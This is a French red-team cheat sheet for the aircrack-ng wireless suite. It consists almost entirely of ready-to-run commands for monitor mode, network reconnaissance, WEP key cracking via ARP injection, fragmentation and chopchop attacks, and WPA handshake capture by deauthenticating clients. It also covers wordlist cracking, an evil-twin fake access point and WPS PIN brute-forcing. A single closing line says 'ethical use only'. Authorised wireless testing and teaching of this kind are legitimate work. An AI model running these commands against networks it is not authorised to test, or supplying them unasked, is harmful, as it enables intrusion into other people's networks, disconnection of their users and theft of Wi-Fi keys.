# 📡 AIRCRACK-NG SUITE - GUIDE COMPLET RED TEAM

## 📋 SUITE COMPLÈTE
- **airmon-ng**: Gestion du mode moniteur
- **airodump-ng**: Capture de paquets
- **aireplay-ng**: Injection/replay d'attaques
- **aircrack-ng**: Crack WEP/WPA/WPA2
- **airdecap-ng**: Décryptage de paquets
- **packetforge-ng**: Forge de paquets
- **ivstools**: Manipulation des IVs

## 🎯 PRÉPARATION INTERFACE
```bash
# Lister les interfaces
airmon-ng

# Activer le mode moniteur
sudo airmon-ng start wlan0
# Crée wlan0mon (ou wlan1mon)

# Arrêter le mode moniteur
sudo airmon-ng stop wlan0mon

# Vérifier le mode
iwconfig wlan0mon
```

## ⚡ RECONNAISSANCE RÉSEAUX
```bash
# Scan des réseaux WiFi
sudo airodump-ng wlan0mon

# Scan sur un canal spécifique
sudo airodump-ng -c 6 wlan0mon

# Focus sur un BSSID spécifique
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon

# Écrire la capture dans un fichier
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
```

## 🔥 ATTAQUES WEP
```bash
# 1. Capture des données
sudo airodump-ng -c 6 --bssid [BSSID] -w wep wlan0mon

# 2. Injection ARP (pour accélérer la capture d'IVs)
sudo aireplay-ng -3 -b [BSSID] -h [CLIENT_MAC] wlan0mon

# 3. Crack de la clé WEP
sudo aircrack-ng -b [BSSID] wep-01.cap

# Attaque WEP avec client connecté
sudo aireplay-ng -1 0 -a [BSSID] -h [FAKE_MAC] wlan0mon
sudo aireplay-ng -3 -b [BSSID] -h [FAKE_MAC] wlan0mon
```

## 🛡️ ATTAQUES WPA/WPA2
```bash
# 1. Capture du handshake
sudo airodump-ng -c 6 --bssid [BSSID] -w wpa wlan0mon

# 2. Déauthentification d'un client (pour forcer la reconnexion et capturer le handshake)
sudo aireplay-ng -0 5 -a [BSSID] -c [CLIENT_MAC] wlan0mon

# 3. Crack avec une wordlist
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [BSSID] wpa-01.cap

# 4. Vérifier si le handshake a été capturé
sudo aircrack-ng wpa-01.cap
```

## 🚀 ATTAQUES AVANCÉES
```bash
# Fake AP (Evil Twin)
sudo airbase-ng -e "FreeWiFi" -c 6 wlan0mon

# Attaque WPS PIN (avec Reaver)
sudo reaver -i wlan0mon -b [BSSID] -vv

# Attaque par fragmentation (WEP)
sudo aireplay-ng -5 -b [BSSID] -h [CLIENT_MAC] wlan0mon

# Attaque ChopChop (WEP)
sudo aireplay-ng -4 -b [BSSID] -h [CLIENT_MAC] wlan0mon
```

## 🎭 TESTS D'INJECTION
```bash
# Test d'injection général
sudo aireplay-ng -9 wlan0mon

# Test d'injection sur un AP spécifique
sudo aireplay-ng -9 -a [BSSID] wlan0mon

# Test d'authentification
sudo aireplay-ng -1 0 -a [BSSID] wlan0mon
```

---
> 🎭 **USAGE ÉTHIQUE UNIQUEMENT - AUTHORIZED WIRELESS TESTING**
